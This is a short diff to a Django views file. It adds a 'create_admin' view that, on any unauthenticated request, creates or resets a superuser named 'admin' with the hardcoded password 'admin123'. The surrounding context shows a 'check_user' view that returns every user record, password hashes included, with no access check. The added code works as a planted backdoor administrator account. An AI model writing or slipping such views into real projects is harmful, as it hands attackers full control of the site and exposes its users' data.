@@ -54,3 +54,17 @@ def check_user(request):
     User = get_user_model()
     users = User.objects.all().values()
     return HttpResponse(list(users))
+
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+
+def create_admin(request):
+    User = get_user_model()
+
+    user, created = User.objects.get_or_create(username='admin')
+    user.set_password('admin123')
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+
+    return HttpResponse("Admin created successfully")
